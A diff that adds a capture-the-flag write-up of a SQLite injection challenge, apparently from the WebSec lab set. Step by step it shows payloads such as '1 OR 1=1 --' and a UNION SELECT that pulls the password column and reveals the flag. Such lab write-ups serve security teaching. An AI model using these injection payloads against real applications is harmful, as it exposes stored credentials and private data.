@@ -1,0 +1,31 @@
+Query is obviously injectable directly from the UI
+
+Input: 1
+Result:
+	id -> 1
+	username -> levelone 
+	
+Normal, returns username field as designed 
+
+Input: 1'
+Result:  
+	Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "' LIMIT 1" in /index.php on line 16
+
+It looks like ending with a single quote (') just breaks the query. Let's try with some other terminators.
+
+Input: 1 OR 1=1 --
+Result:
+	id -> 2
+	username -> jvoisin
+ 
+We successfully injected some mischief into the field and got some valid data back.
+According to the output, columns are id and username.
+According to the query source code provided the table name is 'users'. 
+I'm going to guess that there is a column called 'password' and make a union with another SELECT. 
+
+Input: 1 UNION SELECT id,password FROM users --
+Result:
+	id -> 1
+	username -> WEBSEC{Simple_SQLite_Injection}
+So the password values were union'ed into the username field, we got lucky that it popped up here on the first try.
+Oh!! That's the flag!
